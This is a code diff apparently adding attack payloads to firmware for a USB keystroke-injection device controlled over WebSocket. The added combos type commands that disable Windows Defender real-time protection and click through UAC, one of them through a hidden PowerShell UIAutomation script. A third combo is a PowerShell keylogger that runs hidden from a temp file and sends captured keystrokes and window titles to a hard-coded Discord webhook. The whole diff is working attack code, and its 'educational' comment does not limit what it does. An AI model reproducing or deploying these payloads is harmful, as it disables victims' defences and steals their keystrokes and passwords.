@@ -696,6 +696,150 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] Persistence launched\n");
+      } else if (combo == "KillDefender") {
+        // Disable Windows Defender Real-Time Monitoring via pure UI navigation
+        // Bypasses script detection by acting as a legitimate user interacting with Settings
+        
+        // 1. Open Windows Security Threat Settings directly via URI
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        delay(20);
+        Keyboard.releaseAll();
+        delay(800);
+        Keyboard.print("windowsdefender://threatsettings");
+        delay(200);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        
+        // Wait for Windows Security app to load fully
+        delay(3000); 
+        
+        // 2. Spacebar toggles the first switch ("Real-time protection")
+        Keyboard.press(' ');
+        delay(20);
+        Keyboard.releaseAll();
+        
+        // Wait for UAC prompt
+        delay(1500); 
+        
+        // 3. Navigate UAC (Left Arrow -> Enter for "Yes")
+        Keyboard.press(KEY_LEFT_ARROW);
+        delay(20);
+        Keyboard.releaseAll();
+        delay(100);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        
+        // Extra delay to ensure UAC resolves and toggle applies
+        delay(1000);
+        
+        // Close the Windows Security Window (ALT + F4)
+        Keyboard.press(KEY_LEFT_ALT);
+        Keyboard.press(KEY_F4);
+        delay(20);
+        Keyboard.releaseAll();
+        
+        LOG("[WebKB] KillDefender (UI Method) launched\n");
+      } else if (combo == "KillDefender++") {
+        // KillDefender++ (Smart UI Automation Method)
+        // Uses PowerShell UIAutomation to check if Real-time protection is already off.
+        // If ON: UIAutomation clicks the toggle, triggers UAC, we bypass UAC, then close.
+        // If OFF: Does nothing, leaves it OFF. Bypasses Tamper Protection!
+        
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        delay(20);
+        Keyboard.releaseAll();
+        delay(800);
+        Keyboard.print("windowsdefender://threatsettings");
+        delay(200);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        delay(3000); // Wait for Windows Security to load
+        
+        // Run PowerShell script via Win+R -> cmd to check state and trigger space only if ON
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        delay(20);
+        Keyboard.releaseAll();
+        delay(800);
+        Keyboard.print("cmd");
+        delay(200);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        delay(1000);
+        
+        Keyboard.print(
+            "start /min powershell -w h -nop -ep bypass -c \""
+            "Add-Type -A UIAutomationClient;"
+            "$e=[windows.automation.automationelement]::RootElement.FindFirst([windows.automation.TreeScope]::Descendants, [windows.automation.PropertyCondition]::new([windows.automation.AutomationElement]::NameProperty, 'Real-time protection'));"
+            "if($e -and $e.Current.Name -notmatch 'Off'){"
+            "  (New-Object -Com WScript.Shell).SendKeys(' ');"
+            "  Start-Sleep -s 1.5;"
+            "  (New-Object -Com WScript.Shell).SendKeys('{LEFT}');"
+            "  Start-Sleep -m 100;"
+            "  (New-Object -Com WScript.Shell).SendKeys('{ENTER}');"
+            "}"
+            "Start-Sleep -s 1;"
+            "(New-Object -Com WScript.Shell).SendKeys('%{F4}')\" & exit");
+            
+        delay(300);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        
+        LOG("[WebKB] KillDefender++ (Smart UI) launched\n");
+      } else if (combo == "Keylogger") {
+        // Keylogger via GetAsyncKeyState → Discord webhook
+        // Educational/lab use only
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        delay(20);
+        Keyboard.releaseAll();
+        delay(800);
+        
+        // Run the user-provided PowerShell Keylogger script directly into a PowerShell console
+        Keyboard.print("powershell");
+        delay(300);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        
+        // Wait for PowerShell Console to open
+        delay(1000);
+        
+        Keyboard.print(
+            "$s='$w=''https://discord.com/api/webhooks/1483556317455974440/Y1v5PEy_lfnxs7-YRDcsCGTiChAfGB4p8jDnq07uCwHKNgqul2WJOnLQ3Z9ToREwrt-Y'';$b='''';$t=Get-Date;$seen=@{};$last=@{};"
+            "Add-Type -MemberDefinition ''[DllImport(\\\"user32.dll\\\")]public static extern short GetAsyncKeyState(int k);'' -Name K -Namespace W -EA SilentlyContinue;"
+            "try{Invoke-RestMethod -Uri $w -Method Post -ContentType ''application/json'' -Body ''{\\\"content\\\":\\\"[START]\\\"}''}catch{};"
+            "while($true){"
+            "Get-Process|Where-Object{$_.MainWindowTitle -ne '''' -and !$seen[$_.Id]}|ForEach-Object{$seen[$_.Id]=$true;"
+            "try{Invoke-RestMethod -Uri $w -Method Post -ContentType ''application/json'' -Body (''{\\\"content\\\":\\\"\\n[WIN] ''+$_.ProcessName+'' | ''+$_.MainWindowTitle+''\\\"}'')}catch{}};"
+            "8..254|ForEach-Object{"
+            "  $k=$_;"
+            "  if(([W.K]::GetAsyncKeyState($k) -band 32768) -ne 0){"
+            "    if(!$last[$k]){"
+            "      $last[$k]=$true;"
+            "      if($k -eq 8){$b+=''[BKSP]''}elseif($k -eq 9){$b+=''[TAB]''}elseif($k -eq 13){$b+=''[ENTER]''}elseif($k -ge 32 -and $k -le 126){$b+=[char]$k}"
+            "    }"
+            "  }else{$last[$k]=$false}"
+            "};"
+            "if($b.Length -gt 0 -and ($b.Length -gt 15 -or ((Get-Date)-$t).Seconds -gt 3 -or $b -match ''\\[ENTER\\]$'' -or $b -match ''\\[TAB\\]$'')){"
+            "try{Invoke-RestMethod -Uri $w -Method Post -ContentType ''application/json'' -Body (''{\\\"content\\\":\\\"''+$b+''\\\"}'')}catch{};$b='''';$t=Get-Date};"
+            "Start-Sleep -Milliseconds 30}';"
+            "$s|Out-File $env:TEMP\\k.ps1;"
+            "Start-Process powershell -WindowStyle Hidden -ArgumentList \\\"-nop -ep bypass -f $env:TEMP\\k.ps1\\\""
+        );
+            
+        delay(300);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        LOG("[WebKB] Keylogger launched via PowerShell Window\n");
       } else {
         LOG("[WebKB] unknown combo: %s\n", combo.c_str());
       }
